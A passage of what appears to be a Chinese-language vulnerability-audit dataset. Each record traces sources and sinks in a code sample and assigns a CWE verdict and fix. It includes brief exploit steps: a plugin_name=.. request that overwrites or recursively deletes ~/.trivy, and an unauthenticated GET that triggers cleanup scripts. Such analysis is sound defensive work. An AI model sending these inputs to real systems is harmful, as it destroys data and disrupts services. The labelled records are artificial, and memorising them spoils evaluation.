+line 39-49: "filesystem root scope allows access" 子测试以 NewScopedFs(afero.NewOsFs(), "/")（第 44 行）验证根作用域回归（#5975），根作用域放行一切路径是产品有意设计，且此处仅为测试断言，不构成生产配置。
+line 70-73: if _, err := fs.Stat("/escape"); !os.IsPermission(err) 与 fs.Open("/escape/secret.txt") 断言逃逸符号链接被拒绝——测试在验证防御而非引入路径。
+line 120-124: stat(&FileOptions{Fs: bfs, Path: "/link/secret.txt"}) 断言经符号链接祖先逃逸（GHSA-hf77-9m7w-fq8q 回归）返回权限错误，第 123 行同时断言在域内文件 /ok.txt 正常服务。
+line 139-179: inaccessibleChildFs/inaccessibleChildDir 为测试桩，return nil, os.ErrPermission（第 154、162、178 行）用于模拟不可访问子项，验证列表逻辑跳过而非崩溃。
+line 216-228: TestFileInfoRealPathUsesScopedFsRealPath 断言 RealPath() 将 /root/downloads 拼接进 scope（第 223-224 行），无外部输入。
+防御核验：本文件自身无需防御；它验证的 NewScopedFs/stat 生产实现不在样本内，其实际防护效果属样本外假设，不作结论依据。利用可行性：无——不存在攻击者可注入数据的通道。
+has_vulnerability: false
+vulnerability_type: none
+risk_level: None
+source: N/A
+sink: N/A
+explanation: 纯测试代码，所有路径与断言数据由测试内部构造，无外部可控入口；非 CWE-22 因为文件中的符号链接逃逸场景均为验证防御被拒绝的测试夹具而非可达 sink。
+fix_suggestion: no fix needed（可保持对逃逸符号链接与根作用域回归用例的覆盖）
+
+redistill-line-8100
+分析过程: 全入口枚举：无 HTTP 入口；source 为函数参数 root, username（第 18 行 func GetUser(root, username string)），属内部 API 传参（调用方通常来自镜像配置，该调用链为样本外假设，不作依据）；另有 WithUIDGID（第 93 行）接收调用方传入的 uid/gid/sgids。
+line 26-28: 快路径 ParseUIDGID(username) 成功即返回，进入严格数字解析。
+line 58-67: strings.SplitN(str, ":", 2) 后两段分别过 parseUID；第 79-87 行 parseUID 仅接受字面量 "root"→0 或 strconv.ParseUint(str, 10, 32)——十进制、32 位上限，负数/溢出/非数字全部报错，无整数截断（第 87 行 uint32(uid) 在 ParseUint bitSize=32 保证范围内，非 CWE-190）。
+line 30-37: openUserFile(root, "/etc/passwd") 与 /etc/group；第 71-76 行 p, err := fs.RootPath(root, p) 将固定常量路径 /etc/passwd 限制解析在 root 目录内（RootPath 会解析符号链接并阻止逃逸），随后 os.Open(p)。防御核验：有效——路径字面量不含用户输入，root 即使含符号链接也被 RootPath 归一化约束在 root 子树；且 username 不参与文件路径构造。
+line 39: user.GetExecUser(username, nil, passwdFile, groupFile) 中 username 仅作 passwd/group 数据中的查找键，解析结果仅为数值 uid/gid/sgids（第 46-50 行），不进入任何命令、路径或查询 sink。
+line 40-44: 查找失败且 isDefault（username 为空，第 20-22 行）时回落 return 0, 0, nil, nil——空用户名默认 root 是显式设计（第 25 行注释 fast path 同理），非绕过。
+line 93-119: WithUIDGID/ensureAdditionalGids 仅做 spec 字段赋值与去重追加，无外部可控 sink。
+利用可行性：无——即使 username 完全恶意，也只能作为查找键失败报错或按数字解析，无法改变打开的文件路径或注入命令。
+has_vulnerability: false
+vulnerability_type: none
+risk_level: None
+source: N/A
+sink: N/A
+explanation: username 仅流入严格数字解析与受限 passwd 查找，文件打开路径经 fs.RootPath 约束且为常量；非 CWE-22 因为路径分量不受外部输入控制，非 CWE-78 因为文件内不存在任何进程执行 sink。
+fix_suggestion: no fix needed（可考虑对 isDefault 回落 root 的行为补充日志以便审计）
+
+redistill-line-8101
+分析过程: 全入口枚举：无 HTTP/文件/环境入口；source 为库 API 参数——decode(data, size) 的 data（不可信 PSD 压缩流）与 encode(data) 的 data（第 57、95 行）。
+line 73-74: while i < length: i, bit = i + 1, data[i] 每轮外层循环 i 至少 +1（bit==128 时两分支均不进但 i 已前进），无死循环。
+line 75-81: 重复分支：第 76 行 bit = 256 - bit 使重复次数 1+bit ∈ [2,128]，单头字节放大上限 128 倍；第 77-78 行 if j + 1 + bit > size: raise ValueError 在写入前把累计输出严格约束在调用方声明的 size 内——防御核验：有效，恶意流无法制造超出 size 的内存分配（非解压炸弹）；第 79 行 data[i : i + 1] 为切片访问，头字节位于流末尾时返回空 bytearray，不越界。
+line 82-87: 字面量分支：第 83 行同时校验 i + 1 + bit > length（输入侧）与 j + 1 + bit > size（输出侧），双向边界完备。
+line 89-90: 终检 len(result) != size 拦截欠量/超量解码，截断流以 ValueError 失败而非静默错误数据。
+line 101: MAX_LEN = 0xFF >> 1（=127）；第 116-117 与 125-126 行在两个内层循环中以 j - i >= MAX_LEN 截断游程/字面段。
+line 121: result.extend((256 - (j - i), data[i]))——进入该分支的前置条件（第 114 行 data[j] == data[j+1]，j==i）保证内层至少执行一次 j += 1，故 j-i ∈ [1,127]，头字节落在 [129,255]，合法且不产生负值。
+line 122/146: i = j = j + 1 与 i = j（字面分支中 j 必 > i，第 127-128 行 pass 后第 143 行 j += 1 至少推进一次）保证外层每轮 i 严格前进；第 144 行 result.append(j - i - 1) 值域 [0,126]，无越界头字节。
+利用可行性：无——Python 切片/bytearray 自带边界语义，且所有循环推进与输出量均被 length/size/MAX_LEN 三重约束，构造不出内存破坏、无限循环或超量分配输入。
+has_vulnerability: false
+vulnerability_type: none
+risk_level: None
+source: N/A
+sink: N/A
+explanation: 解码输出被 size 上限与逐分支边界检查完全约束、编码游程被 MAX_LEN 截断且头字节值域可证合法；非 CWE-190/787 因为不存在手工内存边界运算，非 CWE-400 因为单头字节放大上限 128 倍且总量 ≤ size。
+fix_suggestion: no fix needed
+
+redistill-line-8178
+分析过程: 全入口枚举：三个 HTTP 入口——第 17 行 @app.route("/plugins/install", methods=["POST"])、第 49 行 @app.route("/plugins/<name>/output")、第 58 行 @app.route("/plugins/uninstall", methods=["POST"])；第 4 行导入的 subprocess 全文件未使用，无命令执行 sink。
+line 20: plugin_name = request.form.get("plugin_name") —— source，完全外部可控。
+line 14: 防御点 NAME_RE = re.compile(r"[A-Za-z0-9_.-]+Z")（配合第 25、52、61 行的 match 校验）。双向核验：字符类不含 /，多级穿越（如 ../../etc）确被拦截；但字符类显式包含 .，因此纯点串 "." 与 ".." 完整匹配通过——第 13 行注释声称"无分隔符/无 .."，正则并未实现"无 .."这一半，防御可绕过（白名单过宽）。
+line 29: target_dir = os.path.join(PLUGIN_ROOT, plugin_name)，取 plugin_name=".." 时 target_dir = ~/.trivy/plugins/.. ≡ ~/.trivy——目录边界已被跨越。
+line 32-33: os.makedirs(target_dir, exist_ok=True)、archive.save(zip_path) 在越界目录上落地。
+line 37-38: 第二防御点——zip 成员检查 if ".." in m or m.startswith(("/", "")): raise。核验：对 zip-slip（成员名穿越）有效；但作用位置错误——它只约束成员相对路径，无法约束解压根目录 target_dir 本身已越界的事实，第 39 行 zf.extract(m, target_dir) 仍把攻击者 zip 内容写入 ~/.trivy。
+line 60-64: uninstall 入口 name = request.form.get("plugin_name") → 第 63 行 os.path.join(PLUGIN_ROOT, name) → 第 64 行 shutil.rmtree(target_dir)；name=".." 时递归删除整个 ~/.trivy，破坏性最强路径。
+line 50-55: output 入口 name=".." 时第 54 行 out_file = os.path.join(PLUGIN_ROOT, name, "output.txt") 指向 ~/.trivy/output.txt，send_file 可读取上一级目录文件（受固定文件名 output.txt 限制）。
+利用可行性：最小利用——(1) POST /plugins/install，form 字段 plugin_name=..，附任意 zip（成员名不含 ..）→ 解压覆写 ~/.trivy 下任意文件；(2) POST /plugins/uninstall，plugin_name=.. → 一条请求删除整个 ~/.trivy。无需认证即可远程执行。
+互斥锚句：非 CWE-73 因为可控的 ".." 分量实现了目录边界上跳而非仅文件名控制；非 CWE-184 作为主类型因为缺陷表现为路径穿越后果（正则过宽是根因，但按影响判 22）。
+has_vulnerability: true
+vulnerability_type: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
+risk_level: High
+source: line 20: request.form.get("plugin_name")（同型 source 见 line 50 路由参数与 line 60 表单字段）
+sink: line 39: zf.extract(m, target_dir)（越界解压写入）；line 64: shutil.rmtree(target_dir)（越界递归删除）
+explanation: 白名单正则允许纯 ".." 通过，使 target_dir 跨越 PLUGIN_ROOT 上一级，导致越界写文件与递归删除；zip 成员级 ".." 检查有效但作用位置错误，防不住解压根本身被控。
+fix_suggestion: 第 14 行收紧校验拒绝点分量，如 NAME_RE = re.compile(r"(?!.+)[A-Za-z0-9_.-]+Z") 或显式 if plugin_name in (".", ".."): 400；并在第 29/63 行后用 os.path.realpath(target_dir).startswith(os.path.realpath(PLUGIN_ROOT) + os.sep) 二次确认目录仍在根内。
+
+redistill-line-82
+分析过程: 全入口枚举：无外部输入——main（第 52 行）中 g_len = 4 为常量，线程参数 &id1/&id2（第 60-61 行）指向 main 栈上局部变量且生命周期覆盖 pthread_join（第 63-64 行），第 37 行 int id =(int)arg 解引用安全。
+line 54-56: g_shared = (int*)malloc(sizeof(int) * g_len)，g_len=4 为编译期常量，sizeof(int)*4 无溢出可能（非 CWE-190）；malloc 失败即 return 1。
+line 27-34: 防御点 release_shared：pthread_mutex_lock(&g_mutex)（第 28 行）→ if (g_shared) 判空（第 29 行）→ free(g_shared)（第 30 行）→ g_shared = nullptr（第 31 行）→ 解锁（第 33 行）。双向核验：有效——判空、释放、置 NULL 三步全部在同一互斥锁临界区内原子完成，任何后续调用者（第 48 行两个 worker、第 67 行 main 的"第三次释放"）在锁内看到的要么是有效指针（首个到达者释放），要么是 nullptr（直接跳过 free），free 幂等化。
+line 39-44: worker 读取 g_shared[0]（第 42 行）同样持有 g_mutex（第 39 行）并在临界区内先判空（第 40 行）——读与释放被同一把锁串行化，不存在"判空通过后、解引用前被另一线程释放"的 TOCTOU 窗口，因为判空与解引用同处临界区。
+line 15-20: Buffer 析构 if (data) { free(data); data = nullptr; } 自带判空防护；且第 10-13 行构造中 malloc 失败时 size = 0、data 为 null，析构判空跳过，无 null 解引用。该类在本文件中未被实例化使用，不构成风险。
+利用可行性：无——注释虽写"第三次释放"，但可执行语义上 release_shared 至多执行一次真实 free；构造不出 double free 或 use-after-free 的交错序列。次要非安全事项：usleep（第 45 行）未包含 <unistd.h>，属可移植性问题。
+has_vulnerability: false
+vulnerability_type: none
+risk_level: None
+source: N/A
+sink: N/A
+explanation: 锁内判空+释放+置 NULL 的幂等释放模式使三次 release_shared 调用仅首次真实 free，读写与释放全部由 g_mutex 串行化；非 CWE-415 因为第二次及以后的 free 被临界区内判空拦截，非 CWE-416 因为第 42 行的读取与第 30 行的释放不可能并发。
+fix_suggestion: no fix needed（可补充 #include  以规范 usleep 声明）
+
+redistill-line-9334
+分析过程: 全入口枚举：入口A——第 24-38 行 poll()：第 25 行 addr := os.Getenv("CONFIG_ADDR")（环境变量，操作员控制，其取值信任属样本外假设），第 27 行 http.Get(addr + "/v1/snapshot") 拉取远端 JSON，第 29-32 行将 s.Tool/s.Hook/s.Host 送入三条链路；入口B——第 19-20 行注册 /apply 并 ListenAndServe(":8081") 绑定全部网卡，第 40-45 行 handleApply 从 r.URL.Query() 取 tool/hook/host 送入同三条链路，两个入口均无任何认证/鉴权代码。
+line 66-73: 流1 RunTool：第 67 行 path, ok := toolTable[name]——外部输入仅作查表键，第 71 行 exec.Command(path) 执行的路径取自第 57 行硬编码表；第 68 行叠加 nameRe（第 62 行 ^[a-z0-9_]{1,24}）校验。核验：对命令注入有效，外部数据不进入命令名或参数位。
+line 76-82: 流2 RunHook：第 77 行键查第 60 行常量表得 cmdStr，第 81 行 exec.Command("sh", "-c", cmdStr)——虽经 shell，但 cmdStr 只能是表内两条常量之一，攻击者无法向其拼接任何字符。核验：有效。
+line 85-91: 流3 SyncHost：第 86 行 net.SplitHostPort，第 87 行强制 port != "123" 拒绝 + hostRe（第 63 行首字符限 [a-zA-Z0-9.]）——首字符不可为 -，排除 ntpdate 参数注入；第 90 行 exec.Command("ntpdate", "-u", h) 独立参数、不经 shell。核验：有效。
+缺陷链（认证缺失）：line 40 handleApply → line 41-43 无认证直接触发三条链路 → sink 为 line 71（执行 backup.sh/cleanup.sh）、line 81（systemctl reload appd/logrotate）、line 90（ntpdate）。最小利用：未认证攻击者向 http://<host>:8081/apply?tool=cleanup&hook=reload&host=a.example:123 发一条 GET，即可远程触发清理脚本执行与服务 reload——状态变更类关键运维功能完全暴露；GET+查询参数形态还可被任意网页以 <img src> 跨站触发。影响上限受硬编码命令集约束（无法注入任意命令），故为有限 DoS/运维状态篡改而非 RCE。
+入口A 的远端配置值流入的是同一组已核验防御的链路，注入不成立；风险集中于入口B 的零认证暴露。
+互斥锚句：非 CWE-78/77/88 因为外部输入自始至终未进入命令文本或命令参数位（仅查表键与受 hostRe 约束的独立参数）；非 CWE-862 因为问题不是对象级授权缺失而是端点整体无认证（306）；非 CWE-352 因为该 API 为运维端点、非浏览器会话语义，根因是缺认证而非缺 CSRF token。
+has_vulnerability: true
+vulnerability_type: CWE-306: Missing Authentication for Critical Function
+risk_level: Medium
+source: line 41: r.URL.Query().Get("tool")（及 line 42 hook、line 43 host；未经认证的远程 HTTP 查询参数）
+sink: line 81: exec.Command("sh", "-c", cmdStr).Run()（触发 systemctl reload/logrotate；同类 sink 见 line 71 脚本执行与 line 90 ntpdate）
+explanation: /apply 端点在无认证状态下允许远程触发执行备份/清理脚本与 systemctl reload 等状态变更操作，而三条链路的命令注入防御（查表+正则+独立参数）本身有效，风险限于固定命令集的未授权触发。
+fix_suggestion: 第 40 行 handleApply 前增加认证中间件（如共享密钥 Header/mTLS/本机回环限制），并将第 19-20 行的监听收敛到运维内网地址；第 41-43 行改为仅接受 POST 并校验请求来源。
+
+##### redistill-line-7667
+分析过程:
+入口枚举：本切片为 LiteLLM 代理管线回调 CustomCodeGuardrail.apply_guardrail（第 202-208 行），非 HTTP 直接入口；其 inputs/request_data 派生自 LLM 请求上下文（请求方可控数据），而被执行代码文本 custom_code 来自 guardrail 配置模型（类骨架段 custom_code: str，配置方=代理管理员，属信任侧）。
+类骨架段：from .code_validator import CustomCodeValidationError, validate_custom_code 与 from .primitives import get_custom_code_primitives——代码文本在配置装载期经校验器编译为 self._compiled_function，编译与沙箱规则实现不在切片内；样本外假设：校验器按类文档（"No imports allowed"等）实施限制，此处不作为结论依据，仅说明本切片执行的是预编译产物而非原始字符串。
+line 235: if self._compiled_function is None: 配合第 236-240 行抛出 CustomCodeExecutionError——防御核验：未通过编译则 fail closed，不会退化到任何动态求值路径，有效。
+line 246: safe_request_data = self._prepare_safe_request_data(request_data)——防御核验：传入用户代码的请求数据先做最小化（实现体在切片外，样本外假设其按名称过滤敏感字段）；作用位置正确——在数据进入用户代码之前。
+line 249: result = self._compiled_function(inputs, safe_request_data, input_type)——逐跳关键点：请求方可控内容（inputs 中的用户消息文本）仅作为已编译函数的数据实参传递，不进入 eval/exec/compile/模板文本任何代码生成位；执行逻辑在配置期已固定。攻击者无法借 LLM 请求内容改变被执行代码。
+line 252-253: if asyncio.iscoroutine(result): result = await result——仅异步适配，无安全语义。
+line 263-265: except HTTPException: raise——block 动作语义原样上抛，防御（拦截）不被吞掉，有效。
+line 266-276: 异常包装 f"Custom code guardrail execution failed: {e}" 且第 267-268 行将 {e} 写入日志——原始异常文本可能携带内部细节；切片内无证据表明该消息直接返回给不可信客户端，记为加固点而非独立漏洞。
+文档矛盾核验：类 docstring 声称 "No file I/O or network access"，但第 219-220 行建议 "using http_request, http_get, or http_post primitives"——说明沙箱有意提供受控网络原语给配置作者；该能力面向可信管理员（配置即代码的产品语义），非请求侧攻击面。
+利用可行性：构成代码执行漏洞需满足其一：(a) 不可信主体可写 custom_code 配置；(b) 沙箱校验器可被绕过。两者实现均不在本切片，样本内无任何请求侧输入到达代码文本位置的通路，最小利用路径不成立。
+互斥锚句：非 CWE-95，因为输入不进入 eval/exec/Function 文本位，仅作为编译产物的实参数据；非 CWE-94，因为不存在"输入拼接生成代码文本再执行"的环节；非 CWE-502，因为无反序列化器参与。
+has_vulnerability: false
+vulnerability_type: none
+risk_level: None
+source: N/A
+sink: N/A
+explanation: 主链：custom_code 由信任侧配置在装载期编译（第 235 行 fail-closed 门），请求可控数据仅经第 246 行最小化后作为第 249 行已编译函数的数据实参传入，不存在输入到代码文本位的通路；非 CWE-94/95，因为无任何运行期代码生成或求值接收请求内容。
+fix_suggestion: no fix needed。加固建议：第 270-271 行对外错误消息避免内插原始异常文本 {e}（改为通用文案，详情仅入日志），并统一类 docstring 与第 219-220 行关于网络原语的矛盾描述。
+
+redistill-line-7968
+分析过程:
+入口枚举：run_task（第 177-183 行）为 MCP 服务端工具处理器调用的库 API；参数 task_id 由服务端应用开发者代码传入，非远程客户端直接可控（客户端可控需调用方主动转发，属调用方代码，样本外假设）；task_metadata/_session/_task_support 由请求上下文注入（第 56-59 行）。
+line 240-248: if self._task_support is None: raise RuntimeError(...)、if self._session is None: raise RuntimeError(...)、if self.task_metadata is None: raise RuntimeError(...)——防御核验：三重前置校验均 fail closed，阻止在任务支持未启用或非 task-augmented 请求上下文中创建任务，有效且不可旁路（顺序执行、无分支跳过）。
+line 254-257: if task_id is None: session_scope = self._session.experimental.task_session_scope; if session_scope is not None: task_id = scoped_task_id(session_scope)——防御核验（核心）：默认路径生成内嵌会话作用域的 ID，docstring 第 201-202 行自证 "default task handlers only serve the task to the session that created it"，即授权绑定在 ID 构造层完成；对省略 task_id 的调用（推荐用法，第 234 行示例 run_task(work)）防御有效。
+line 238-239: warnings.warn(EXPLICIT_TASK_ID_DEPRECATION, DeprecationWarning, stacklevel=2) 与第 167-175 行 @deprecated 重载——对显式 task_id 危险路径的双重弃用标注。双向论证该路径：第 259 行 task = await support.store.create_task(self.task_metadata, task_id) 对显式 ID verbatim 使用、不绑定会话，第 37-41 行常量自述 "any requestor that presents the ID can read its status and result or cancel it"——该路径确实无会话授权绑定；但触发前提是服务端开发者主动选用已弃用参数，且 DeprecationWarning 在生产默认被静默，属"保留的弃用不安全 API"而非默认不安全设计，本样本默认路径已消除该攻击面。
+line 99-117: mode = tool_task_mode or TASK_FORBIDDEN 起，if mode == TASK_REQUIRED and not self.is_task:（第 103 行）与 elif mode == TASK_FORBIDDEN and self.is_task:（第 108 行）构造 ErrorData，第 114-115 行 if error is not None and raise_error: raise McpError(error)——防御核验：按 MCP 规范双向拒绝模式不匹配请求，默认 fail closed（raise_error=True），None 模式归入 forbidden（第 99 行）为保守缺省，有效。
+line 269-276: result = await work(task_ctx) 异常时 await task_ctx.fail(str(e))（第 276 行）——原始异常文本写入任务状态；默认路径下能读取该状态的是创建会话本身，泄露面受限；若走显式 task_id 路径则任何持 ID 者可读，与上一条弃用路径风险叠加。记加固点。
+利用可行性：最小利用路径需服务端调用方执行 run_task(work, task_id=<客户端可控值>)（已弃用形态），此后任意会话可凭该 ID 读取/取消任务；本样本内默认调用（task_id=None）无此通路，第 254-257 行强制会话作用域，利用不成立。
+互斥锚句：非 CWE-639，因为默认路径 ID 本身内嵌会话作用域完成授权绑定，不存在"已做授权检查但对象引用可任意替换"的 IDOR 结构；非 CWE-862 就默认调用而言，因为作用域校验由 scoped_task_id 在创建时落实（default handlers 的读取侧强制在样本外，标注为样本外假设，不作结论依据）。
+has_vulnerability: false
+vulnerability_type: none
+risk_level: None
+source: N/A
+sink: N/A
+explanation: 主链：默认调用经第 254-257 行 scoped_task_id(session_scope) 生成会话绑定 ID，第 240-248 行三重 fail-closed 前置校验，任务仅服务创建会话；非 CWE-639/862，因为授权绑定在 ID 构造层默认完成，危险的显式 task_id 路径已被第 167-175/238-239 行双重弃用且需开发者主动选用。
+fix_suggestion: no fix needed。加固建议：第 276 行 task_ctx.fail(str(e)) 改为写入泛化错误码/文案、原始异常仅入服务端日志，避免经任务状态外泄内部细节；后续主版本可将第 238-239 行的警告升级为直接拒绝显式 task_id。
